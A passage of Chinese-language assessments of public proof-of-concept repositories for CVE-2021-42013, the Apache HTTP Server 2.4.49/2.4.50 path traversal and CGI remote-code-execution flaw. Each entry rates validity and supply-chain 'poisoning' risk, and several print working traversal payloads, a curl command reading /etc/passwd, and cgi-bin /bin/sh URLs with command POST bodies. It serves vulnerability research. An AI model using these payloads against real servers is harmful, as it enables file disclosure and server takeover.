## CVE-2021-42013-Apache HTTP Server-Path Traversal 和 Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal 和 Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和服务器被完全控制

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，并且存在Alias-like配置，CGI脚本开启，且目录权限配置不当（缺少 'require all denied'）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013是CVE-2021-41773的不完整修复，允许攻击者利用路径遍历漏洞读取Alias配置以外的文件，如果CGI脚本被启用，可能导致远程代码执行。

**有效性：**
根据漏洞信息和搜索结果，该漏洞是真实存在的，并且有公开的PoC代码。提供的PoC代码包含Dockerfile用于搭建漏洞环境，以及Python脚本用于验证Path Traversal和Remote Code Execution，因此PoC代码有效。

**投毒风险：**
检查了提供的PoC代码，包括Dockerfile和Python脚本。Dockerfile用于搭建包含漏洞的Apache HTTP Server环境，其中包含了从Apache官网下载httpd-2.4.50.tar.gz的步骤，以及添加了httpd.conf配置文件的步骤，还包括了index.php和login.php页面的添加步骤，并未发现明显的恶意代码或后门。

Python脚本cve-2021-42013.py主要是利用requests库发送HTTP请求，进行Path Traversal和Remote Code Execution的验证。脚本本身没有发现包含恶意代码的行为。虽然理论上，可以修改此脚本来执行恶意操作，但在提供的代码中并没有发现这种行为。因此，投毒风险较低，大概在5%左右。

**利用方式：**
利用方式主要有两种：

1.  **Path Traversal（路径遍历）：** 攻击者通过构造包含“../”的恶意URL，绕过Alias配置的限制，读取服务器上的任意文件。前提是这些文件没有被 'require all denied' 保护。

2.  **Remote Code Execution（远程代码执行）：** 如果服务器启用了CGI，攻击者可以通过路径遍历漏洞访问到CGI脚本，并执行任意系统命令。通常需要先上传一个包含恶意代码的CGI脚本，然后通过路径遍历漏洞来执行它。提供的代码中，RCE的利用依赖于CGI的启用和适当的权限配置。

综上所述，此漏洞的利用，通常需要结合服务器的具体配置情况，如Alias配置、CGI是否启用、目录权限等。提供的PoC代码可以帮助验证漏洞的存在，但也需要根据实际情况进行调整。


**项目地址:** [bananoname/cve-2021-42013](https://github.com/bananoname/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #10

**来源**: [CVE-2021-42013-cybfar_cve-2021-42013-httpd.md](../2021/CVE-2021-42013-cybfar_cve-2021-42013-httpd.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在Alias-like指令配置，CGI脚本已启用，且相关目录没有'require all denied'保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50中存在的一个路径遍历漏洞，是对CVE-2021-41773的不完整修复。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%%32e`）的URL，绕过Alias-like指令的限制，访问服务器上未受保护的文件。如果CGI脚本也已启用，则攻击者可能利用此漏洞执行任意代码。

**有效性评估：**
提供的Dockerfile和README.md描述了如何搭建一个存在漏洞的Apache HTTP Server环境。README.md中提供的`curl`命令

```bash
curl -v --path-as-is localhost:8000/icons/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd
```

可以用来验证漏洞的存在，如果返回`/etc/passwd`文件的内容，则表明目标存在路径遍历漏洞。

**投毒风险评估：**
查看Dockerfile，该文件从`debian:latest`镜像构建，安装必要的依赖项，下载并编译Apache HTTP Server 2.4.50。`httpd.conf`文件被添加到`/conf/httpd.conf`，并启动Apache服务。并没有发现明显的恶意代码或后门。

但是，以下因素可能导致一定的投毒风险：

1.  **httpd.conf替换：**Dockerfile使用 ADD 指令替换了默认的httpd.conf文件,可能通过修改配置来引入安全风险,如启用不安全的模块或配置项。
2.  **基础镜像安全：** 虽然Dockerfile使用了`debian:latest`，但基础镜像本身可能存在未知的漏洞。
3.  **第三方组件：** 构建过程中使用`apt-get`安装了一些依赖，这些组件也可能包含潜在的安全风险。

总体来说，该项目存在一定的投毒风险，但主要集中在配置不当和依赖项漏洞方面，作者主动植入恶意代码的可能性较低。因此，投毒风险评定为10%。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`.%%32e`的URL，尝试访问服务器上的任意文件。`%%32e`是`.`的URL编码，可以绕过一些路径过滤机制。
2.  **远程代码执行 (如果CGI启用):** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历漏洞找到CGI脚本的路径，并执行任意代码。这通常需要结合其他漏洞利用技术，例如上传恶意CGI脚本。

**总结：**
该漏洞利用的有效性较高，但需要满足一定的条件才能实现远程代码执行。投毒风险较低，主要集中在配置和依赖项安全方面。建议在使用该POC时，仔细检查`httpd.conf`文件，并确保基础镜像和依赖项的安全性。

**项目地址:** [cybfar/cve-2021-42013-httpd](https://github.com/cybfar/cve-2021-42013-httpd)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #11

**来源**: [CVE-2021-42013-drackyjr_CVE-2021-42013.md](../2021/CVE-2021-42013-drackyjr_CVE-2021-42013.md)

## CVE-2021-42013 Apache HTTP Server Path Traversal 和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache 版本，且 Alias-like 指令配置不当，CGI脚本启用，以及相应的目录权限配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞是 CVE-2021-41773 的不完整修复，存在于 Apache HTTP Server 2.4.49 和 2.4.50 中。攻击者可以利用路径遍历漏洞读取服务器上的任意文件，如果服务器启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/.%2e/` 或双重 URL 编码的 `%%32%65%%32%65/` 的恶意 URL，绕过 Apache 的路径限制，访问受限目录之外的文件。
2.  **远程代码执行（如果 mod_cgi 启用）：** 攻击者通过路径遍历访问 CGI 脚本，并利用 POST 请求发送恶意命令。由于服务器将 URL 路径当作可执行文件，POST 数据当作输入，从而执行攻击者提供的命令。

**POC 代码分析：**

提供的 Python 脚本 `CVE-2021-41773.py` 包含以下功能：

*   **路径遍历检测 (CVE-2021-41773)：** 使用 `/.%2e/.%2e/.%2e/.%2e/` 构造 payload，尝试读取 `/etc/passwd` 和 `/etc/shadow` 文件。
*   **双重 URL 编码路径遍历检测 (CVE-2021-42013)：** 使用 `%%32%65%%32%65/` 构造 payload，尝试读取 `/etc/passwd` 文件。
*   **远程代码执行检测：**  尝试通过 CGI 脚本执行 `id` 命令。如果服务器返回包含 `uid=` 或 `gid=` 的响应，则表示存在 RCE 漏洞。

**有效性：**

根据漏洞描述和 POC 代码的实现，提供的 POC 代码是有效的，可以用于检测目标服务器是否存在 CVE-2021-42013 漏洞，如果目标服务器配置不当，还可检测 RCE 漏洞。

**投毒风险：**

该POC代码是一个扫描器，用于检测漏洞的存在，主要功能是发送 HTTP 请求并分析响应。 代码本身的功能是漏洞检测，不存在恶意行为或后门。对代码进行分析后，可以认为投毒风险为0%。

**总结：**

CVE-2021-42013 是一个严重的安全漏洞，可能导致服务器上的敏感信息泄露，甚至被远程控制。请及时将 Apache HTTP Server 升级到安全版本，并检查服务器配置，确保 Alias-like 指令配置正确，并禁用不必要的 CGI 脚本。

**项目地址:** [drackyjr/CVE-2021-42013](https://github.com/drackyjr/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #12

**来源**: [CVE-2021-42013-dream434_cve-2021-42013-apache.md](../2021/CVE-2021-42013-dream434_cve-2021-42013-apache.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache HTTP Server 版本，并且开启了 CGI 脚本执行。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

**有效性评估：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞利用是有效的。
*   **漏洞描述：** CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的一个路径遍历漏洞，是 CVE-2021-41773 的不完整修复。
*   **利用方式：** 攻击者可以通过构造包含`/.%%32%65`的恶意URL，绕过 Alias 指令的限制，访问到服务器上的任意文件。如果目标服务器配置允许 CGI 脚本执行，攻击者可以利用此漏洞执行任意代码。
*   **搜索引擎结果：** 大量文章和漏洞库条目确认了该漏洞的存在和严重性，并提供了利用此漏洞的PoC或思路。
*   **PoC代码分析：**提供的 `exploit.py` 脚本尝试通过构造包含路径遍历字符串的URL来执行命令。脚本使用 POST 请求向目标服务器的 CGI 目录发送请求，并在请求体中包含要执行的命令。该脚本的核心在于利用`/.%%32%65`绕过路径检查，配合 CGI 脚本执行命令。代码逻辑比较清晰，且与漏洞描述相符，故有效性较高。

**投毒风险评估：**

*   **代码分析：**
    *   `requirements.txt` 只包含 `colorama` 库，这是一个用于在终端显示彩色的库，本身没有安全风险。
    *   `exploit.py` 脚本的主要功能是利用 CVE-2021-42013 漏洞进行攻击。代码中没有发现明显的恶意代码，例如反弹shell、下载执行恶意文件等。但是，脚本本身可以被用于恶意目的，即远程代码执行。
    *   `README.md` 文件是项目说明文档，没有可疑内容。
*   **投毒可能性：**
    *   该脚本的主要目的是利用已知的漏洞，而不是植入后门或进行其他恶意活动。因此，直接在脚本中添加恶意代码的可能性较低。
    *   由于脚本需要用户提供目标 URL 和要执行的命令，攻击者可以通过控制命令内容来达到恶意目的。但这不属于代码投毒的范畴。
*   **风险评估：**
脚本本身存在被恶意利用的风险，如果代码仓库的维护者在后续版本中添加恶意代码，则可能存在投毒风险。代码投毒的可能性较低，只有 `5%`

**利用方式：**

1.  **目标确认：** 确定目标 Apache HTTP Server 运行的版本为 2.4.49 或 2.4.50。
2.  **CGI 目录定位：** 找到目标服务器上配置的 CGI 目录，例如 `/cgi-bin/`。
3.  **构造恶意URL：** 构造包含路径遍历字符串的 URL，例如 `http://example.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh`。
4.  **发送请求：** 使用 POST 请求向构造的 URL 发送请求，并在请求体中包含要执行的命令。
5.  **获取结果：** 解析响应结果，获取命令执行的结果。

例如，使用提供的 `exploit.py` 脚本执行 `id` 命令：

```bash
python3 exploit.py http://example.com id
```

**注意事项：**

*   利用此漏洞需要在目标服务器上启用 CGI 脚本执行，并且相关目录没有进行严格的权限控制。
*   使用此漏洞进行攻击可能导致严重的后果，请务必在获得授权的情况下进行测试。

**项目地址:** [dream434/cve-2021-42013-apache](https://github.com/dream434/cve-2021-42013-apache)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #13

**来源**: [CVE-2021-42013-hadrian3689_apache_2.4.50.md](../2021/CVE-2021-42013-hadrian3689_apache_2.4.50.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和服务器完全控制

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 需要目标服务器运行受影响的Apache HTTP Server版本，并且配置了Alias-like指令，CGI脚本也需要启用才能实现RCE

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-42013 漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用路径遍历攻击，将 URL 映射到 Alias-like 指令配置的目录之外的文件。如果这些目录之外的文件没有被默认的 “require all denied” 配置保护，请求就能成功。如果 CGI 脚本对这些 aliased 路径启用，可能导致远程代码执行。

**漏洞利用方式：**

1.  **路径遍历 (LFI):** 攻击者使用 `icons/%%32%65%%32%65/...` 这样的payload进行路径穿越，读取服务器上的任意文件（例如 `/etc/passwd`）。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI，攻击者可以利用路径遍历访问 `cgi-bin` 目录，并执行任意命令。PoC 代码中使用了 `.%%32%65` 编码绕过了一些过滤。
    *   PoC 代码中，RCE 通过构造包含恶意命令的 HTTP POST 请求发送到 `cgi-bin` 目录下的 `sh` 脚本来实现。

**有效性评估：**

提供的 PoC 代码有效。它包含 LFI 和 RCE 两种利用方式，并且提供了命令行参数来指定目标 URL，要读取的文件，或者要执行的命令。

**投毒风险评估：**

检查 PoC 代码，没有发现明显的恶意代码或后门。该代码主要功能是利用漏洞进行文件读取或命令执行，没有发现主动修改或上传文件的行为。代码的功能与漏洞描述一致，风险较低。


**项目地址:** [hadrian3689/apache_2.4.50](https://github.com/hadrian3689/apache_2.4.50)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #14

**来源**: [CVE-2021-42013-jas9reet_CVE-2021-42013-LAB.md](../2021/CVE-2021-42013-jas9reet_CVE-2021-42013-LAB.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并启用CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013漏洞是CVE-2021-41773修复不完全导致的。攻击者可以利用路径遍历漏洞，访问Alias指令配置目录之外的文件。如果这些文件没有被"require all denied"等默认配置保护，请求就会成功。如果CGI脚本也为此路径启用，则可能导致远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，可以判断该漏洞利用是有效的。搜索引擎结果中多个链接都表明CVE-2021-42013是一个已知的、可利用的漏洞，并且存在公开的PoC。

**利用方式：**
利用方式是构造包含路径遍历的URL，结合CGI脚本执行命令。PoC中的`exploit.sh`脚本使用curl发送包含恶意命令的POST请求到目标服务器。关键点在于使用`--path-as-is`参数，以及双URL编码的路径遍历字符串`%%32%65`，绕过Apache的路径检查。如果目标服务器开启了CGI，并且未对/bin/sh等命令进行限制，则可以执行任意命令。

**投毒风险评估：**
分析提供的Dockerfile、httpd.conf、exploit.sh和README.md文件。

*   Dockerfile： 使用了官方的httpd:2.4.50镜像作为基础镜像,并复制httpd.conf和index.html,未发现恶意行为。
*   httpd.conf：正常的Apache配置文件，用于配置服务器基本信息,没有发现不正常的配置。
*   exploit.sh：这是一个漏洞利用脚本，它本身就是用来执行恶意操作的，**不能算作** 投毒代码。脚本的目的是利用漏洞，而非在目标系统植入后门或者进行其他恶意活动。
*   README.md: 只是说明了如何使用Docker环境来运行漏洞利用代码的步骤.

虽然没有明显的投毒代码，但是利用漏洞本身就可以在目标服务器上执行恶意操作。比如，攻击者可以利用这个漏洞上传webshell，从而长期控制服务器。这种通过漏洞植入后门的风险依然存在，但是从代码本身来看，并没有发现作者预先植入的、非漏洞利用目的的恶意代码。
 综合评估，认为存在10%的投毒风险，主要是因为利用成功后，攻击者可以自行植入恶意代码。

**项目地址:** [jas9reet/CVE-2021-42013-LAB](https://github.com/jas9reet/CVE-2021-42013-LAB)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #15

**来源**: [CVE-2021-42013-mightysai1997_cve-2021-42013.get.md](../2021/CVE-2021-42013-mightysai1997_cve-2021-42013.get.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，且Alias配置不当并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中存在的一个路径遍历和远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。漏洞库信息明确指出该漏洞允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。搜索引擎结果也证实了该漏洞的存在，并提供了相关的利用信息。

提供的 Dockerfile 和 Python 脚本 `cve-2021-42013.py` 构成了一个可用于验证和利用该漏洞的 POC。Dockerfile 用于构建一个包含易受攻击的 Apache HTTP Server 2.4.50 实例的 Docker 镜像。Python 脚本可以用来检测路径遍历或远程代码执行漏洞。

**投毒风险：**

对 POC 代码进行分析，`cve-2021-42013.py` 脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。它包含以下功能：

*   **路径遍历 PoC (-pt)：**  尝试利用路径遍历漏洞读取服务器上的文件。
*   **远程代码执行 PoC (-rce)：**  如果服务器启用了 CGI，则尝试执行命令。
*   **批量扫描 (-l)：**  从文件中读取 URL 列表并进行扫描。

潜在的投毒风险点在于：

1.  **依赖项：**  脚本依赖于 `requests` 和 `urllib` 库，理论上可以通过篡改这些库来植入恶意代码，但这种情况的可能性较低。
2.  **CGI 执行：**  远程代码执行依赖于服务器启用 CGI，如果攻击者控制了 CGI 脚本的内容，则可以执行任意代码。但这更多的是漏洞利用本身的风险，而非 POC 代码的投毒。

综合来看，该 POC 代码的投毒风险较低，约为 5%。 主要风险来自CGI环境和脚本本身。没有发现明显的恶意代码。

**利用方式：**

利用该漏洞需要以下步骤：

1.  **确定目标服务器是否运行受影响的 Apache HTTP Server 版本 (2.4.49 或 2.4.50)。**
2.  **检查服务器的 Alias 配置。**  Alias 指令将 URL 映射到文件系统上的特定目录。漏洞利用的关键在于绕过这些 Alias 指令的限制。
3.  **如果服务器启用了 CGI，则可以尝试远程代码执行。**  攻击者可以构造一个包含恶意代码的 CGI 脚本，并通过路径遍历漏洞来执行它。
4.  **如果服务器未启用 CGI，则可以尝试路径遍历漏洞来读取敏感文件。**

攻击者可以使用如下 payload 来进行漏洞测试：

*   **路径遍历：** `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`
*   **远程代码执行：**  需要服务器启用 CGI，并构造包含恶意代码的 CGI 脚本。

**项目地址:** [mightysai1997/cve-2021-42013.get](https://github.com/mightysai1997/cve-2021-42013.get)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #16

**来源**: [CVE-2021-42013-mightysai1997_cve-2021-42013.md](../2021/CVE-2021-42013-mightysai1997_cve-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且存在Alias配置不当或CGI脚本未做权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是对CVE-2021-41773的不完全修复。攻击者可以利用路径遍历漏洞读取Alias配置目录之外的文件，如果未配置"require all denied"，则可以成功读取。如果同时启用了CGI脚本，则可能导致远程代码执行。

**有效性：** 提供的POC代码针对CVE-2021-42013，包含Dockerfile、README.md和利用脚本。Dockerfile用于构建存在漏洞的Apache HTTP Server环境，README.md包含漏洞描述、环境搭建和脚本使用说明。利用脚本cve-2021-42013.py提供路径遍历和远程代码执行两种利用方式，通过参数`-u`指定目标URL，`-pt`执行路径遍历，`-rce`执行远程代码执行，`-l`批量扫描。

**投毒风险：**  检查`cve-2021-42013.py` 脚本，发现脚本功能正常，主要是构造payload发送请求，判断是否存在漏洞。 但是Dockerfile中直接wget下载了 httpd-2.4.50.tar.gz 包，存在被中间人攻击替换为恶意包的风险。且start.sh脚本权限被设置为777，任何用户都有修改权限，存在被植入后门的风险。 综合评估，投毒风险较低，约为10%。

**利用方式：**

1.  **路径遍历：** 利用`..`进行目录跳转，读取目标服务器上的任意文件。例如，`http://target/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以构造包含恶意代码的URL来执行命令。例如，访问`/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`并传入shell命令作为参数。

利用的前提是目标Apache服务器版本为2.4.49或2.4.50，且存在Alias配置不当，或者CGI脚本未做严格的权限控制。需要关注服务器配置是否启用CGI，以及是否存在权限开放的目录，例如`icons`目录。

**项目地址:** [mightysai1997/cve-2021-42013](https://github.com/mightysai1997/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #17

**来源**: [CVE-2021-42013-mightysai1997_cve-2021-42013L.md](../2021/CVE-2021-42013-mightysai1997_cve-2021-42013L.md)

## CVE-2021-42013: Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 服务器运行Apache HTTP Server 2.4.49或2.4.50，并且存在Alias-like指令配置，同时CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞，是 CVE-2021-41773 的不完整修复。

**有效性：**

提供的POC代码有效。它展示了利用路径遍历漏洞读取 `/etc/passwd` 文件的几种方式。通过URL编码 `.` (点) 字符（例如：`%2e`, `%32%65`），攻击者可以绕过服务器的安全检查，访问受限目录之外的文件。

**投毒风险：**

该仓库主要包含漏洞利用相关的文档和PoC，直接嵌入恶意代码的可能性较低。但仍不能完全排除投毒风险，因为攻击者可能会修改 README.md 等文件诱导用户执行恶意操作，例如下载恶意软件，占比约为5%。

**利用方式：**

1.  **路径遍历：** 攻击者利用URL中的编码过的路径遍历字符（如 `.%%32e/.%%32e/.%%32e/.%%32e` ）尝试访问位于Alias-like指令配置目录之外的文件。
2.  **信息泄露：** 如果成功绕过限制，攻击者可以读取服务器上的敏感文件，如 `/etc/passwd`，从而获取系统用户信息。
3.  **远程代码执行：** 如果CGI脚本被启用，攻击者可能上传包含恶意代码的CGI脚本并执行，从而实现远程代码执行。

**总结：**

此漏洞利用的关键在于利用路径遍历绕过Alias-like指令的限制，从而访问和执行服务器上的文件。如果服务器配置不当（例如，CGI脚本启用，且未对Alias-like指令配置目录外的文件设置`require all denied`），则可能导致严重的后果，包括敏感信息泄露和远程代码执行。

**项目地址:** [mightysai1997/cve-2021-42013L](https://github.com/mightysai1997/cve-2021-42013L)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #18

**来源**: [CVE-2021-42013-viliuspovilaika_cve-2021-42013.md](../2021/CVE-2021-42013-viliuspovilaika_cve-2021-42013.md)

## CVE-2021-42013 Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许攻击者读取任意文件和执行任意命令

**影响版本:** 2.4.49 and 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache HTTP Server 版本，且启用了 CGI 脚本支持，Alias-like 指令配置不当。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 CVE-2021-41773 的不完整修复。攻击者可以利用路径遍历漏洞读取服务器上任意文件，如果服务器配置允许执行 CGI 脚本，则可以通过构造恶意请求执行任意命令。

**有效性：**

提供的 POC 代码是有效的。搜索引擎结果和漏洞库信息均表明 CVE-2021-42013 允许路径遍历和远程代码执行，POC 代码本身也实现了利用该漏洞进行命令执行的功能。

**投毒风险：**

代码本身的功能是利用漏洞进行攻击，不属于恶意投毒代码，但是作者有可能通过其他方式进行投毒，比如修改下载链接，放置引流信息等，几率较低，大约为 5%。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`/.%%%%32%%65`，用于绕过 Apache 的路径规范化）的 URL，利用 Apache HTTP Server 在处理 Alias-like 指令时的缺陷，突破目录限制，访问服务器上的任意文件。
2.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问到 CGI 脚本的目录，然后构造包含恶意命令的请求体，利用 CGI 脚本执行任意命令。
3.  **具体步骤：**
    *   构造 URL：`{host}/cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh`
    *   构造 POST 数据：`echo Content-Type: text/plain; echo; {command}`
    *   发送 HTTP 请求，服务器执行命令并将结果返回。

**项目地址:** [viliuspovilaika/cve-2021-42013](https://github.com/viliuspovilaika/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #19

**来源**: [CVE-2021-42013-vudala_CVE-2021-42013.md](../2021/CVE-2021-42013-vudala_CVE-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 服务器运行受影响的Apache版本，存在Alias-like指令配置，且允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历和远程代码执行漏洞。该漏洞是CVE-2021-41773的不完整修复。攻击者可以通过构造包含路径遍历序列（如`..`）的恶意URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果服务器配置允许在这些别名路径上执行CGI脚本，攻击者还可以利用该漏洞执行任意代码。

**有效性评估：**
根据漏洞信息、搜索结果和提供的Dockerfile和docker-compose.yml，提供的POC代码旨在搭建一个存在漏洞的Apache HTTP Server 2.4.50环境。因此，该POC代码是有效的，可以用于验证和复现该漏洞。

**投毒风险评估：**
仔细分析了Dockerfile，httpd.conf和suricata.yaml文件，该文件用于部署一个可利用的Apache服务器。然而，无法保证其中没有任何隐藏的恶意代码。虽然主要目的是重现CVE-2021-42013，但仍存在细微的投毒风险。尽管可能性较低，但在未充分审查每个组件的情况下，无法完全排除风险。
httpd.conf可能存在非默认配置，方便漏洞利用。

**利用方式分析：**
1.  **环境搭建：** 使用提供的Dockerfile和docker-compose.yml搭建存在漏洞的Apache HTTP Server 2.4.50环境。
2.  **路径遍历：**  构造包含路径遍历序列的URL，例如：`http://<服务器IP>:8080/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试访问服务器上的`/etc/passwd`文件。
3.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，可以构造包含恶意代码的URL，例如：`http://<服务器IP>:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh`，并执行系统命令。

成功利用此漏洞需要满足特定条件，包括存在易受攻击的Apache版本、适当的服务器配置和网络可访问性。

**项目地址:** [vudala/CVE-2021-42013](https://github.com/vudala/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #20

**来源**: [CVE-2021-42013-walnutsecurity_cve-2021-42013.md](../2021/CVE-2021-42013-walnutsecurity_cve-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和 Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感文件泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且Alias配置不当，允许访问受限目录，如果开启了CGI脚本支持，则可能造成RCE

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中存在的路径遍历和远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。

**漏洞利用方式：**

攻击者可以利用路径遍历攻击，将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 “require all denied” 等常见默认配置的保护，请求就会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

根据提供的 Dockerfile 和 Python 脚本，利用方式如下：

1.  **路径遍历：** 通过构造包含 ".." 的恶意 URL，绕过 Alias 限制，访问服务器上的任意文件。
2.  **远程代码执行：** 如果服务器启用了 CGI，攻击者可以上传一个包含恶意代码的 CGI 脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**POC 代码分析：**

